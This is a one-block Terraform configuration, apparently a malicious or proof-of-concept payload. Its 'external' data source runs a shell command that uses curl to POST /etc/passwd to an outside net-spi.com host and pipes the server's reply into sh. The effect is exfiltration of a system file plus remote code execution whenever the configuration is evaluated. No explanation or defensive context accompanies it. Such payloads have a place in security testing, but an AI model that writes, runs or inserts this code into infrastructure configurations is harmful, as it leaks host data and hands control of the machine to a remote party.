data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/etc/passwd https://qgaug4e4r6jk9wq1nwgts67fa6gz4ssh.net-spi.com/exfil4 | sh"] 
} 
